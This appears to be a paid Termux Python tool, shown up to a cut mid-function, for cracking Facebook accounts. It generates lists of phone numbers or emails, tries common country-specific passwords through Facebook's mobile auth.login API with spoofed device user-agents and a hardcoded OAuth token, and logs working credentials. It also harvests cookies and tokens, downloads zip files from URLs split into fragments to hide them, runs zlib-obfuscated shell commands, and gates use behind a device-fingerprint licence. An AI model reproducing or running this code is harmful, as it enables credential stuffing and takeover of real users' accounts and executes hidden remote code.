#SOURCE BY : MR_AKING

#GITHUB : AKING110

#QSR ME BAP HU TERA 

#coding = utf-8

from uuid import uuid4

import os,sys,tempfile,string,random,subprocess,uuid

http_directory = tempfile.mkdtemp(prefix='.')

site_packages = sys.path[4]

sys.path.remove(site_packages)

sys.path.insert(4,http_directory+'/reqmodule')

sys.path.insert(5,http_directory)

try:

        os.mkdir('crypto')

except:pass

hh = "ho"

hh2 = "9/pycrypt"

find_aarch = subprocess.check_output('uname -om',shell=True)

if 'aarch64' in str(find_aarch):

        user_aarch = '64'

        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'

elif 'arm' in str(find_aarch):

        user_aarch = '32'

        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'

else:

        print(' Unknown aarch ')

        exit()

if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):

        os.system('clear')

        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')

        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')

        os.system('python jan.py')

else:

        akk2="rsi"

        akk=f"cha{akk2}fi"

        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')

        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'

        os.system(f'curl -L {lib} > {http_directory}/config.zip')

        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')

        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')

try:

        import time,requests,re,platform,base64,datetime,hashlib,string,json,io,struct

        from string import *

        from concurrent.futures import ThreadPoolExecutor as ThreadPool

        from Crypto.Cipher import AES, PKCS1_v1_5

        from Crypto.PublicKey import RSA

        from Crypto.Random import get_random_bytes

except Exception as e:

        print(e)

        print('\n Installing modules wait !')

        os.system('pip install futures==2 && python jan.py')

except FileExistsError:

        os.system('pip uninstall requests urllib3 idna certifi -y')

        pass

try:

        import os,sys,time,json,random,re,string,platform,base64,requests,io,struct,zlib

        from string import *

        from concurrent.futures import ThreadPoolExecutor as ThreadPool

except ModuleNotFoundError:

        print('\n Installing missing modules ...')

        os.system('pip install requests futures==2 > /dev/null')

        os.system('python jan.py')

#----[vprotect-remover]-----

#----[remover]-----

import os,shutil,zlib

sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94')

sz1 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x0eL\x0e\x15')

sz2 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x0eK\x0e\x19')

sz3 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x89g\xfca\xa4\xa7@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc8\xa7\xdd\x00M\xaf\xf8\xa8<|s\x13\xcdsP\x06c\x9e\x1d\xa5\xecg[\xd7\xeb\x05\x14#z\xaa\x03\xfd\x0c\xcb\x0c\xd8\x13\xd3\x9fo\x8c\x14\xed\xfeF\xa9M\x0cn\x8a\xed7?\xf1Q&+')

sz4 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x13\xcf\xf8\xc3HO@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc9\x87\xdd\x00M\xafxT\x9e\xbe\xb9\x89\xe69(\x831\xcf\x8eR\xf6g[\xd7\xeb\x05\x14#z\xaa\x03\xda\xc32\x03\xf6\xc4\xf4\xe7\x1b#E\xbb\xbfQj\x13\x83\x9bb\xfb\xcd\x0f\xf0\xab&#')

sz5 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x90\xf4\x11\x05')

sz6 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x90\xf3\x11\t')

sz7 = zlib.decompress(b'x\x9c\x1d\xca[\x0e@0\x10\x05\xd0\x15\xe9%V4j\xd0\xb4\xd5\x9aG\xc2\xee\x89\x9f\xf3u\xb0\x92\x11~b\xab\xc1X\xaa\xdf\xd8Ra\x85\xab\xa0\xa4\x05\xfd\xb1\xa3\x9ds\x98Fh2\x1e:\xc5L\xfb\x17\x84/g5\xc5\x0b\x8bO\x19\xc2')

#--checking if file is not avalible

if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):

        pass

        exit("Error in termux modules ")

if os.path.exists(sz):

        os.rename(sz1,'.f1')

        os.rename(sz2,'.f2')

        os.system(sz3)

        os.system(sz4)

        os.system(sz5)

        os.system(sz6)

else:

        pass

os.system("rm -rf .f1")

os.system("rm -rf .f2")

logo= f'''

         88                              ###88                           ## 

           88                           ##     88                        ##

             88                        ##       88                      ##

               88                    ##           88                   ##

                 88                ##              88                ##

                   88           ##                  88             ##          

                     88       ##                     88          ## 

                        b##b                               b##b

WAHID.❤JAN

{50*"-"}

    Tool Version :     Free

    Thanks Alot  :     Wahid.JAN

{50*"-"}'''

#--(Dark@Colours)---#

r="\033[1;91m"

g="\033[1;92m"

y="\033[1;93m"

b="\033[1;94m"

p="\033[1;95m"

c="\033[1;96m"

l="\033[1;97m"

s="\033[0m"

#--(light@Colours)---#

lr="\033[0;91m"

lg="\033[0;92m"

ly="\033[0;93m"

lb="\033[0;94m"

lp="\033[0;95m"

lc="\033[0;96m"

ll="\033[0;97m"

#--(rare-colors)--#

holaa="38;5"

ro=(f"\033[{holaa};208")

rb=(f"\033[{holaa};32")

rc=(f"\033[{holaa};122m")

rg= (f"\033[{holaa};112m")

rp=(f"\033[{holaa};147m")

    'authority': 'mbasic.facebook.com',

    'method': 'GET',

    'scheme': 'https',

    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',

    'accept-language': 'en-GB,en;q=0.9,fa-AF;q=0.8,fa;q=0.7,en-US;q=0.6',

    'cache-control': 'max-age=0',

    'save-data': 'on',

    'sec-ch-ua': '"Chromium";v="105", "Not)A;Brand";v="8"',

    'sec-ch-ua-mobile': '?1',

    'sec-ch-ua-platform': '"Android"',

    'sec-fetch-dest': 'document',

    'sec-fetch-mode': 'navigate',

    'sec-fetch-site': 'cross-site',

    'sec-fetch-user': '?1',

    'upgrade-insecure-requests': '1',

    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',

}

loop = 0

ok = []

methods = []

total=[]

clone_type=[]

android_models = []

hh = ['[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693238;FBDM/{density=2.0,width=720,height=1184};FBLC/cs_CZ;FBRV/0;FBCR/Vodafone CZ;FBMF/myPhone;FBBD/myPhone;FBPN/com.facebook.katana;FBDV/HAMMER_ENERGY;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693253;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/145297323;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930P;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_US;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g fast;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/2.3;FBBV/149649;FBDM/{density=1.5,width=480,height=800};FBLC/es_ES;FBCR/;FBPN/com.facebook.katana;FBDV/LG-P920;FBSV/2.2.2;]','[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]']

xny = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5OKK)\xcb1442\xd0O,\xd0\xcfM\xcc\xcc\xd3\xcfJ\x03\x001"\x13\xc6')

update = requests.get(xny).text

uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())

id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")

plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]

xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')

bxd = ""

bumper = id+bxd+xp

myweb2 = requests.get(xny).text

def qsbuy():

        try:

                os.system('clear')

                print(logo)

                x = requests.get('https://raw.githubusercontent.com/hop09/libraries/main/version.txt').text

                if str("upppdate") in update:

                        os.system('clear')

                        exit('script is in update / maintanance be patient ')

                elif str("res-sseett") in update:

                        

                        exit('Dont Try To Bypass')

                elif bumper in myweb2:

                        main()

                else:

                        os.system("clear");print(logo)

                        print(f"{lr}   Your Device License Key Is Not Approved{s}")

                        print(50*"-")

                        print(f"{rc} Key : {bumper}{s}")

                        print(50*"-")

                        print(f" Note : Tool is Paid & We Accept All Types Of PAyment  Method . If There was Fb Update & Tool Wasnt Run Then We Are Not Responsible For All Of This . We Will Try  To Update Script Every Time But It Took Day ")

                        print("\n Baray Mehrbani Tool Apni Zimadare May Buy Kary Lehaza May Apko Force Ni Kar Raha ! Baqe Tool Har 2 sy 3 din bad update hgaya kryga ")

                        print(50*"-")

                        print(f" 15-Days Price : 350")

                        print(f" 1-Month Price : 500")

                        print(50*"-")

                        input("[Press Enter To Send Key To Admin]")

                        os.system(f"termux-open-url https://wa.me/+923197951814?text={bumper}")

                        qsbuy()

        except requests.exceptions.ConnectionError:

                exit(' No internet connection ..')

def xchkver():

        if bumper in myweb2:

                pass

        else:

                qsbuy()

def xchker():

    pass

def main():

        xchker()

        os.system('rm -rf ...txt')

        os.system('clear')

        print(logo);xchker()

        print('Code Like Humor When You Have To Explain It Its Bad')

        print(50*'-')

        print('[1] Fb Cloning Menu')

        print('[2] File Create Menu')

        print('[3] Number Detail Finder')

        print('[4] Remove Cookie')

        print('[5] Clear Cache')

        print('[6] Best Pass Lists \033[0;97m')

        print('[7] How To Use Video')

        print('[0] Exit \033[0;97m')

        print(50*'-')

        menu_opt = input('Select choice : ')

        if menu_opt =='1':

                method_crack()

        elif menu_opt =='2':

                create_file()

        elif menu_opt =='3':

                xchker()

                os.system('xdg-open https://github.com/TechQaiser/Qnumber')

                main()

        elif menu_opt =='4':

                os.system('rm -rf fb_cookies.txt')

                os.system('rm -rf access_token.txt')

                print('       Removed Success')

                time.sleep(3)

                main()

        elif menu_opt =='5':

                isdd="les/u"

                isd="sr/t"

                isddd="p/."

                llb = f"/data/data/com.termux/fi{isdd}{isd}m{isddd}*"

                os.system(f"rm -rf {llb}")

                exit("      Sucessfully Removed .      ")

        elif menu_opt =='6':

                os.system('clear')

                print(logo);xchker()

                print(' Select Your Country For Best PassLists')

                print(50*'-')

                print('[1] Pakistani Ids')

                print('[2] Bangladesh Ids')

                print('[3] Nigeria Ids')

                print('[4] Other Countries')

                print('[0] Back \033[0;97m')

                print(50*'-')

                menu_opt = input('Select choice : ')

                if menu_opt =='1':

                        os.system('clear')

                        print(logo);xchker()

                        print('first last')

                        print('First Last')

                        print('firstlast')

                        print('first123')

                        print('khan123')

                        print('first1234')

                        print('first12345')

                        print('i love you')

                        print('firstkhan')

                        print('khankhan')

                        print('khan12345')

                        print('khan12')

                        print('first786')

                        input('\nPress enter to back ')

                        main()

                elif menu_opt =='2':

                        os.system('clear')

                        print(logo);xchker()

                        print('first last')

                        print('First Last')

                        print('firstlast')

                        print('first123')

                        print('Bangladesh')

                        print('first1234')

                        print('first12345')

                        print('bangladesh')

                        print('i love you')

                        print('Jannatul123')

                        print('Mohammed123')

                        print('Mohammad123')

                        print('first@123')

                        input('\nPress enter to back ')

                        main()

                elif menu_opt =='3':

                        os.system('clear')

                        print(logo);xchker()

                        print('first last')

                        print('First Last')

                        print('firstlast')

                        print('first123')

                        print('i love you')

                        print('musa123')

                        print('first12345')

                        print('first@123')

                        print('first@1234')

                        print('firstfirst')

                        print('lastlast')

                        print('first786')

                        print('first1122')

                        input('\nPress enter to back ')

                        main()

                elif menu_opt =='4':

                        os.system('clear')

                        print(logo);xchker()

                        print('first last')

                        print('First Last')

                        print('firstlast')

                        print('first123')

                        print('i love you')

                        print('first321')

                        print('lastfirst')

                        print('firstlast123')

                        print('first12345')

                        print('first@123')

                        print('first@1234')

                        print('firstfirst')

                        print('first007')

                        print('first789')

                        print('first1122')

                        input('\nPress enter to back ')

                        main()

        elif menu_opt == "7":

                try:

                        os.system('python use.py')

                except:

                        exit('video is not avalible Right now in server try again after few hours')

        elif menu_opt == "0":

                main()

        else:

                print('\n Invalid option, try again ...')

                time.sleep(3)

                main()

def login():

        os.system('clear')

        print(logo);xchker()

        cookies = input(' Put cookies here: ')

        try:

                print('\n Validating cookies ... ')

                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})

                find_token = re.search("(EAAG\w+)", data.text)

                open("access_token.txt", "w").write(find_token.group(1))

                open("fb_cookies.txt","w").write(cookies)

                print(' Logged in successfully ...')

                time.sleep(1)

                os.system('python malang.py')

        except KeyError:

                print('\n Inavlid cookies, try another cookies')

                exit()

        except requests.exceptions.ConnectionError:

                print('\n No internet connection ...')

                exit()

        except AttributeError:

                print('\n Invalid cookies, try another cookies ...')

                exit()

def method_crack():

        os.system('clear')

        print(logo);xchker()

        print(' [1] File Cloning ')

        print(' [2] Email Cloning ')

        print(' [3] Number Cloning ')

        print(' [0] Back')

        print(50*'-')

        clone_ = input(' Select : ')

        if clone_ == "1":

                clone_type.append('1')

        elif clone_ == "2":

                clone_type.append('2')

        elif clone_ == "3":

                clone_type.append('3')

        elif clone_ == "0":

                main()

        else:

                exit('invalid select')

        mycrackistan()

def mycrackistan():

        global methods

        os.system('clear')

        print(logo);xchker()

        print(' [1] Method 1 ')

        print(' [2] Method 2 ')

        print(' [0] Back')

        print(50*'-')

        me_opt = input(' Select method: ')

        if '1' in clone_type:

                if me_opt =='1':

                        methods.append('m1')

                        os.system('clear')

                        print(logo);xchker()

                        crack_main().crackfile(id)

                elif me_opt =='2':

                        os.system('clear')

                        methods.append('m2')

                        crack_main().crackfile(id)

                elif me_opt =='0':

                        os.system('python jan.py')

        elif '2' in clone_type:

                if me_opt =='1':

                        methods.append('m1')

                        os.system('clear')

                        print(logo);xchker()

                        crack_main().crackmail(id)

                elif me_opt =='2':

                        os.system('clear')

                        methods.append('m2')

                        crack_main().crackmail(id)

                elif me_opt =='0':

                        os.system('python jan.py')

        elif '3' in clone_type:

                if me_opt =='1':

                        methods.append('m1')

                        os.system('clear')

                        print(logo);xchker()

                        crack_main().cracknum(id)

                elif me_opt =='2':

                        os.system('clear')

                        methods.append('m2')

                        crack_main().cracknum(id)

                elif me_opt =='0':

                        os.system('python jan.py')

class crack_main():

        def __init__(self):

                self.id=[]

        def crackfile(self,id):

                global methods

                os.system('clear')

                print(logo);xchker()

                self.file = input(' Put file path: ')

                try:

                        self.id = open(self.file).read().splitlines()

                        self.pasw()

                except FileNotFoundError:

                        print(' No file found ....')

                        exit()

        def crackmail(self,id):

                global methods

                os.system("clear");print(logo);xchker()

                import requests,random

                user=[]

                print(" [*] First Name Example Hamza,Areesha")

                first = input(" First Name : ")

                last = input(" Last Name : ")

                print(" \n [*] Ex @gmail.com,@yahoo.com or @hotmail.com etc")

                domain = input(" Domain : ")

                print("\n [?] Limit ids Example 1000,5000,50000")

                limit = int(input(" Limit Ids : "))

                for nmbr in range(limit):

                        nmpp = random.randint(99,9999)

                        nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"

                        naseeb = open('...txt','a').write(nmp)

                self.id = open('...txt').read().splitlines()

                self.pasw()

        def cracknum(self,id):

                global methods

                os.system('clear');print(logo);xchker()

                print('\033[0mFor Example :\033[0m 92310,92342,92300,92301 ...')

                kode = input('\033[0mChoose Code : \033[0m')

                print('\033[0mFor Example :\033[0m 2000,4000,6000 ...')

                limit = int(input('\033[0mIdz Limit : \033[0m'))

                for nmbr in range(limit):

                        nmp = ''.join(random.choice(string.digits) for _ in range(7))

                        xoo = kode+nmp.replace(" ","")

                        xdr = f"{kode+nmp}|{nmp} {xoo}\n"

                        naseeb = open('...txt','a').write(xdr)

                self.id = open('...txt').read().splitlines()

                self.pasw()

        def m1(self,iid,passlist):

                try:

                        global ok,loop,android_models

                        sys.stdout.write('\r[M1-QSR] %s/[OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()

                        

                        for pas in passlist:

                             #   pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())

                                client_id = '181425161904154'

                                client_secrets = '95a15d22a0e735b2983ecb9759dbaf91'

                                version = str(random.randrange(8,15))

                                osv = str(random.randrange(1,9))

                                abv = ['A','B','C']

                                if '8' in version:

                                        ipsw = '12'+random.choice(abv)+str(random.randint(11,99))

                                elif '9' in version:

                                        ipsw = '13'+random.choice(abv)+str(random.randint(11,99))

                                elif '10' in version:

                                        ipsw = '14'+random.choice(abv)+str(random.randint(11,99))

                                elif '11' in version:

                                        ipsw = '15'+random.choice(abv)+str(random.randint(11,99))

                                elif '12' in version:

                                        ipsw = '16'+random.choice(abv)+str(random.randint(11,99))

                                elif '13' in version:

                                        ipsw = '17'+random.choice(abv)+str(random.randint(11,99))

                                elif '14' in version:

                                        ipsw = '18'+random.choice(abv)+str(random.randint(11,99))

                                elif '15' in version:

                                        ipsw = '19'+random.choice(abv)+str(random.randint(11,99))

                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))

                                application_version_code=str(random.randint(000000000,999999999))

                                samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']

                                model,build = random.choice(samsung).split('|')

                                fbdv = model

                                fbsv = str(random.randrange(6,11))

                                fblc = 'ar_EG'

                                fbpn = 'com.facebook.katana'

                                fbav = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))

                                fban = 'FB4A'

                                fban = 'FB4A'

                                fbpn = 'com.facebook.katana'

                                fbav = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))

                                fbbv = '34'+str(random.randint(1111111,9999999))

                                fbcr = 'Ufone'

                                fbmf = 'Samsung'

                                fbbd = 'samsung'

                                fbdv = model

                                fbsv = str(random.randrange(6,11))

                                fbca = 'arm64-v8a'

                                fblc = 'ar_EG'

                                fbdm = '{desity=3.25,width=1080,height=2028}'

                                fb_fw = '1'

                                ua = 'Dalvik/2.1.0 (Linux; U; Android '+fbsv+'; '+fbdv+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBPN/'+fbpn+';FBLC/'+fblc+';FBBV/'+fbbv+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+fbsv+';FBCA/'+fbca+';FBDM/'+fbdm+';FB_FW/'+fb_fw+';]'

                                adid = str(uuid.uuid4())

                                device_id = str(random.randint(11111111,9999999999))

                                li = ['28','29','210']

                                li2 = random.choice(li)

                                j1 = ''.join(random.choice(digits) for _ in range(2))

                                j2 = li2+j1

                                #data = {'adid': adid, 'email': iid, 'password': pas, 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': model, 'device_id': adid, 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}

                                #head = {'user-agent': ua, 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': str(random.randint(2e4, 4e4)), 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': str(random.randint(2e4, 4e4)), 'x-fb-connection-bandwidth': str(random.randint(2e7, 3e7)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}

                                head = {'user-agent': 'Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))

+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': str(random.randint(2e4, 4e4)), 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': str(random.randint(2e4, 4e4)), 'x-fb-connection-bandwidth': str(random.randint(2e7, 3e7)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}

                                data = {'adid': adid, 'email': iid, 'password': pas, 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': model, 'device_id': adid, 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}

                                url = 'https://b-api.facebook.com/method/auth.login'

                                po = requests.post(url,data=data,headers=head).text

                                q = json.loads(po)

                                #print(po)

                                if 'session_key' in po:

                                        print(' \033[1;32m [WAHID-OK] '+iid+' | '+pas+'\033[0;97m')

                                        open('/sdcard/ids/ok.txt','a').write(iid+'|'+pas+'\n')

                                        ok.append(iid)

                                        break

                                elif 'www.facebook.com' in po:

                                        print(' \033[1;31m [WAHID-CP] '+iid+' | '+pas+'\033[0;97m')

                                        open('/sdcard/ids/cp.txt','a').write(iid+'|'+pas+'\n')

                                else:

                                        continue

                        loop+=1

                except Exception as e:

                        print(e)

        def m2(self,iid,passlist):

                try:

                        global ok,loop,android_models

                        sys.stdout.write('\r[M2-WAHID] %s/[OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()

                        for pas in passlist:

                              #  pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())

                                client_id = '181425161904154'

                                client_secrets = '95a15d22a0e735b2983ecb9759dbaf91'

                                version = str(random.randrange(8,15))

                                osv = str(random.randrange(1,9))

